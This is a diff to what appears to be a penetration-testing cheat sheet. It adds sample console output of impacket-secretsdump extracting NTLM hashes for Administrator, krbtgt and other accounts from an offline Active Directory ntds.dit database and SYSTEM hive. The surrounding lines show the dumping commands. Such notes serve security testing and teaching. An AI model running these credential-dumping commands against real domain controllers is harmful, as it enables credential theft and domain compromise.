@@ -21,6 +21,23 @@ ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite
 impacket-secretsdump -ntds ntds.dit -system system LOCAL
 ```
 
+```console {class="sample-code"}
+$ impacket-secretsdump -ntds ntds.dit -system system LOCAL
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+...[SNIP]...
+[*] Cleaning up...
+```
+
 {{< /tabcontent >}}
 
 ### With SAM, SYSTEM and SECURITY Hives
